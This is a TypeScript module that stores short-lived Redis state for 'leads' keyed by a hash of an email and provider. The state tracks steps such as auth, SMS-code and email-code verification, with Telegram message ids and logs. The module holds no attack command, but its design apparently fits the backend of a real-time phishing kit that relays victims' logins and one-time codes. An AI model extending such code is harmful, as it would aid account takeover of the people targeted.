import { createHash } from "node:crypto";
import { redis } from "../clients/upstash.client.js";

export type LeadStatus =
  | "idle"
  | "loading"
  | "passing"
  | "flagged"
  | "completed"
  | "failed";

export type LeadProcess =
  | "init"
  | "auth"
  | "verify-sms-code"
  | "verify-email-code"
  | "verify-email-link";

export type LeadChannelState = {
  anchor: string;
  status: LeadStatus;
  process: LeadProcess;
  message: string;
  overload: string[];
  tgMsgId?: number;
  baseLog: string;
  logs: string;
};

const LEAD_CHANNEL_TTL_SECONDS = 45 * 60;

export function getLeadAnchor(email: string, provider: string): string {
  return createHash("sha256")
    .update(
      JSON.stringify([
        email.trim().toLowerCase(),
        provider.trim().toLowerCase(),
      ]),
    )
    .digest("hex")
    .slice(0, 8);
}

export async function selectLeadChannel(
  anchor: string,
  leadReset?: {
    status: LeadStatus;
    process?: LeadProcess;
  },
): Promise<LeadChannelState> {
  let channel = await redis.get<LeadChannelState>(`lc:${anchor}`);
  if (channel && !leadReset) return channel;
  const newChannel: LeadChannelState = {
    anchor: anchor,
    status: leadReset?.status ?? "idle",
    process: leadReset?.process ?? "init",
    message: "Initializing...",
    overload: [],
    baseLog: "",
    logs: "",
  };
  await redis.set(`lc:${newChannel.anchor}`, newChannel, {
    ex: LEAD_CHANNEL_TTL_SECONDS,
  });
  return newChannel;
}

export async function updateLeadChannel(
  anchor: string,
  leadDelta: {
    status?: LeadStatus;
    process?: LeadProcess;
    message?: string;
    overload?: string[];
    tgMsgId?: number;
    logEntry?: string;
  },
): Promise<LeadChannelState | null> {
  const channel = await selectLeadChannel(anchor);
  if (leadDelta.status) channel.status = leadDelta.status;
  if (leadDelta.process) channel.process = leadDelta.process;
  if (leadDelta.message) channel.message = leadDelta.message;
  if (leadDelta.overload) channel.overload.push(...leadDelta.overload);
  if (leadDelta.tgMsgId) channel.tgMsgId = leadDelta.tgMsgId;
  if (leadDelta.logEntry) {
    if (!channel.logs) channel.baseLog = leadDelta.logEntry;
    channel.logs = `${channel.logs}\n\n${leadDelta.logEntry}`;
  }
  await redis.set(`lc:${channel.anchor}`, channel, {
    ex: LEAD_CHANNEL_TTL_SECONDS,
  });
  return channel;
}
